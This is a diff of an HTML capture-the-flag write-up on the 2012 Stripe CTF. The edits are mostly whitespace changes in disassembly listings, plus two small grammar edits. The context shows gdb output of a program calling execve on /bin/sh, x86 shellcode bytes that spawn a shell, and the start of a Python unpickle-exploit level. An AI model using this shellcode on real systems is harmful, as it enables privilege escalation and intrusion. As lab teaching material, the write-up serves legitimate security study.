@@ -122,7 +122,7 @@
 	<a href="./tag/python.html"><i class="icon-tag"></i>Python</a>
 	<a href="./tag/stripe.html"><i class="icon-tag"></i>Stripe</a>
 </footer><!-- /.post-info -->                </div>
-                <p>Although I did not have the chance of playing in neither of the <a href="https://stripe.com/blog/capture-the-flag">three</a> <a href="https://stripe.com/blog/capture-the-flag-20">Stripe</a> <a href="https://stripe.com/blog/ctf3-launch">CTFs</a>, I was quite enthralled when I took a look at the problems. I decided to solve them anyway and I am writing this series of writeups.</p>
+                <p>Although I did not have the chance of playing in either of the <a href="https://stripe.com/blog/capture-the-flag">three</a> <a href="https://stripe.com/blog/capture-the-flag-20">Stripe</a> <a href="https://stripe.com/blog/ctf3-launch">CTFs</a>, I was quite enthralled when I took a look at the problems. I decided to solve them anyway and I am writing this series of writeups.</p>
 <p>This post is about the first <a href="https://stripe.com/">Stripe</a> CTF, which <a href="https://stripe.com/blog/capture-the-flag-wrap-up">happened in the beginning of 2012</a>. I was able to fully reproduce the game by using a <a href="http://www.janosgyerik.com/hacking-contest-on-a-live-cd/">Live CD Image</a>. Other options were <a href="https://stripe.com/blog/capture-the-flag-wrap-up">direct download and BitTorrent</a>.</p>
 <p>This CTF was composed of 6 levels, and its style was very similar to other Wargames I've talked about before in this blog (for instance, check <a href="http://overthewire.org/wargames/">OverTheWire's</a> <a href="http://bt3gl.github.io/exploiting-the-web-in-20-lessons-natas.html">Natas</a>, <a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html">Narnia</a>, and <a href="http://bt3gl.github.io/cryptography-war-beating-krypton.html">Krypton</a>).</p>
 <hr />
@@ -391,10 +391,10 @@ chmod +x date
 <div class="highlight"><pre><span class="err">$</span> <span class="nx">gdb</span> <span class="nx">shell</span>
 <span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">disas</span> <span class="nx">main</span>
 <span class="nb">Dump</span> <span class="nx">of</span> <span class="nx">assembler</span> <span class="nb">code</span> <span class="nb">for</span> <span class="nx">function</span> <span class="nx">main</span><span class="p">:</span>
-   <span class="mh">0x00000000004004d0</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="nb">push</span>   <span class="o">%</span><span class="nx">rbp</span>
-   <span class="mh">0x00000000004004d1</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">mov</span>    <span class="o">%</span><span class="nx">rsp</span><span class="p">,</span><span class="o">%</span><span class="nx">rbp</span>
-   <span class="mh">0x00000000004004d4</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span> <span class="nb">sub</span>    <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nx">rsp</span>
-   <span class="mh">0x00000000004004d8</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span> <span class="nx">movq</span>   <span class="err">$</span><span class="mh">0x482be4</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nx">rbp</span><span class="p">)</span>
+   <span class="mh">0x00000000004004d0</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nb">push</span>   <span class="o">%</span><span class="nx">rbp</span>
+   <span class="mh">0x00000000004004d1</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">mov</span>    <span class="o">%</span><span class="nx">rsp</span><span class="p">,</span><span class="o">%</span><span class="nx">rbp</span>
+   <span class="mh">0x00000000004004d4</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nb">sub</span>    <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nx">rsp</span>
+   <span class="mh">0x00000000004004d8</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">movq</span>   <span class="err">$</span><span class="mh">0x482be4</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nx">rbp</span><span class="p">)</span>
    <span class="mh">0x00000000004004e0</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">movq</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">-</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nx">rbp</span><span class="p">)</span>
    <span class="mh">0x00000000004004e8</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">mov</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nx">rbp</span><span class="p">),</span><span class="o">%</span><span class="nx">rax</span>
    <span class="mh">0x00000000004004ec</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">lea</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nx">rbp</span><span class="p">),</span><span class="o">%</span><span class="nx">rcx</span>
@@ -426,17 +426,17 @@ chmod +x date
 
 <p>It should be a pointer to <code>/bin/sh</code>, and we can be sure by  asking gdb:</p>
 <div class="highlight"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">s</span> <span class="mh">0x482be4</span>
-<span class="mh">0x482be4</span><span class="o">:</span>    <span class="s">&quot;/bin/sh&quot;</span>
+<span class="mh">0x482be4</span><span class="o">:</span>     <span class="s">&quot;/bin/sh&quot;</span>
 </pre></div>
 
 
 <p>After that, <strong>NULL</strong> is pushed in:</p>
-<div class="highlight"><pre><span class="mh">0x00000000004004f0</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="n">edx</span>
+<div class="highlight"><pre><span class="mh">0x00000000004004f0</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="n">edx</span>
 </pre></div>
 
 
 <p>Finally, <strong>execve</strong> is executed:</p>
-<div class="highlight"><pre><span class="mh">0x00000000004004fb</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>   <span class="nx">callq</span>  <span class="mh">0x40c540</span> <span class="o">&lt;</span><span class="nx">execve</span><span class="o">&gt;</span>
+<div class="highlight"><pre><span class="mh">0x00000000004004fb</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nx">callq</span>  <span class="mh">0x40c540</span> <span class="o">&lt;</span><span class="nx">execve</span><span class="o">&gt;</span>
 </pre></div>
 
 
@@ -484,17 +484,17 @@ chmod +x date
 <span class="nx">shell</span><span class="p">:</span>     <span class="nb">file</span> <span class="nb">format</span> <span class="nx">elf32</span><span class="na">-i386</span>
 <span class="nx">Disassembly</span> <span class="nx">of</span> <span class="nx">section</span> <span class="bp">.</span><span class="nx">text</span><span class="p">:</span>
 <span class="mi">08048054</span> <span class="o">&lt;</span><span class="nx">_start</span><span class="o">&gt;</span><span class="p">:</span>
- <span class="mi">8048054</span><span class="p">:</span>   <span class="mi">31</span> <span class="nx">c0</span>                   <span class="nx">xor</span>    <span class="o">%</span><span class="nx">eax</span><span class="p">,</span><span class="o">%</span><span class="nx">eax</span>
- <span class="mi">8048056</span><span class="p">:</span>   <span class="mi">50</span>                      <span class="nb">push</span>   <span class="o">%</span><span class="nx">eax</span>
- <span class="mi">8048057</span><span class="p">:</span>   <span class="mi">68</span> <span class="mi">2</span><span class="nb">f</span> <span class="mi">2</span><span class="nb">f</span> <span class="mi">73</span> <span class="mi">68</span>          <span class="nb">push</span>   <span class="err">$</span><span class="mh">0x68732f2f</span>
- <span class="mi">804805</span><span class="nx">c</span><span class="p">:</span>   <span class="mi">68</span> <span class="mi">2</span><span class="nb">f</span> <span class="mi">62</span> <span class="mi">69</span> <span class="mi">6</span><span class="nx">e</span>          <span class="nb">push</span>   <span class="err">$</span><span class="mh">0x6e69622f</span>
- <span class="mi">8048061</span><span class="p">:</span>   <span class="mi">89</span> <span class="nx">e3</span>                   <span class="nx">mov</span>    <span class="o">%</span><span class="nx">esp</span><span class="p">,</span><span class="o">%</span><span class="nx">ebx</span>
- <span class="mi">8048063</span><span class="p">:</span>   <span class="mi">50</span>                      <span class="nb">push</span>   <span class="o">%</span><span class="nx">eax</span>
- <span class="mi">8048064</span><span class="p">:</span>   <span class="mi">53</span>                      <span class="nb">push</span>   <span class="o">%</span><span class="nx">ebx</span>
- <span class="mi">8048065</span><span class="p">:</span>   <span class="mi">89</span> <span class="nx">e1</span>                   <span class="nx">mov</span>    <span class="o">%</span><span class="nx">esp</span><span class="p">,</span><span class="o">%</span><span class="nx">ecx</span>
- <span class="mi">8048067</span><span class="p">:</span>   <span class="mi">31</span> <span class="nx">d2</span>                   <span class="nx">xor</span>    <span class="o">%</span><span class="nx">edx</span><span class="p">,</span><span class="o">%</span><span class="nx">edx</span>
- <span class="mi">8048069</span><span class="p">:</span>   <span class="nx">b0</span> <span class="mi">0</span><span class="nx">b</span>                   <span class="nx">mov</span>    <span class="err">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nx">al</span>
- <span class="mi">804806</span><span class="nx">b</span><span class="p">:</span>   <span class="nx">cd</span> <span class="mi">80</span>                   <span class="nx">int</span>    <span class="err">$</span><span class="mh">0x80</span>
+ <span class="mi">8048054</span><span class="p">:</span>    <span class="mi">31</span> <span class="nx">c0</span>                    <span class="nx">xor</span>    <span class="o">%</span><span class="nx">eax</span><span class="p">,</span><span class="o">%</span><span class="nx">eax</span>
+ <span class="mi">8048056</span><span class="p">:</span>    <span class="mi">50</span>                       <span class="nb">push</span>   <span class="o">%</span><span class="nx">eax</span>
+ <span class="mi">8048057</span><span class="p">:</span>    <span class="mi">68</span> <span class="mi">2</span><span class="nb">f</span> <span class="mi">2</span><span class="nb">f</span> <span class="mi">73</span> <span class="mi">68</span>           <span class="nb">push</span>   <span class="err">$</span><span class="mh">0x68732f2f</span>
+ <span class="mi">804805</span><span class="nx">c</span><span class="p">:</span>    <span class="mi">68</span> <span class="mi">2</span><span class="nb">f</span> <span class="mi">62</span> <span class="mi">69</span> <span class="mi">6</span><span class="nx">e</span>           <span class="nb">push</span>   <span class="err">$</span><span class="mh">0x6e69622f</span>
+ <span class="mi">8048061</span><span class="p">:</span>    <span class="mi">89</span> <span class="nx">e3</span>                    <span class="nx">mov</span>    <span class="o">%</span><span class="nx">esp</span><span class="p">,</span><span class="o">%</span><span class="nx">ebx</span>
+ <span class="mi">8048063</span><span class="p">:</span>    <span class="mi">50</span>                       <span class="nb">push</span>   <span class="o">%</span><span class="nx">eax</span>
+ <span class="mi">8048064</span><span class="p">:</span>    <span class="mi">53</span>                       <span class="nb">push</span>   <span class="o">%</span><span class="nx">ebx</span>
+ <span class="mi">8048065</span><span class="p">:</span>    <span class="mi">89</span> <span class="nx">e1</span>                    <span class="nx">mov</span>    <span class="o">%</span><span class="nx">esp</span><span class="p">,</span><span class="o">%</span><span class="nx">ecx</span>
+ <span class="mi">8048067</span><span class="p">:</span>    <span class="mi">31</span> <span class="nx">d2</span>                    <span class="nx">xor</span>    <span class="o">%</span><span class="nx">edx</span><span class="p">,</span><span class="o">%</span><span class="nx">edx</span>
+ <span class="mi">8048069</span><span class="p">:</span>    <span class="nx">b0</span> <span class="mi">0</span><span class="nx">b</span>                    <span class="nx">mov</span>    <span class="err">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nx">al</span>
+ <span class="mi">804806</span><span class="nx">b</span><span class="p">:</span>    <span class="nx">cd</span> <span class="mi">80</span>                    <span class="nx">int</span>    <span class="err">$</span><span class="mh">0x80</span>
 </pre></div>
 
 
@@ -528,7 +528,7 @@ chmod +x date
 
 <hr />
 <h2>Level 5:  Unpickle exploit</h2>
-<p>The fifth level is an uppercasing <strong>web service</strong> written in Python, which is split into an HTTP part, and a worker queue part.</p>
+<p>The fifth level is a uppercasing <strong>web service</strong> written in Python, which is split into an HTTP part, and a worker queue part.</p>
 <p>In this service, a request can be sent  with:</p>
 <div class="highlight"><pre><span class="err">$</span> <span class="n">curl</span> <span class="n">localhost</span><span class="o">:</span><span class="mi">9020</span> <span class="o">-</span><span class="n">d</span> <span class="err">&#39;</span><span class="n">banana</span><span class="err">&#39;</span>
 <span class="p">{</span>
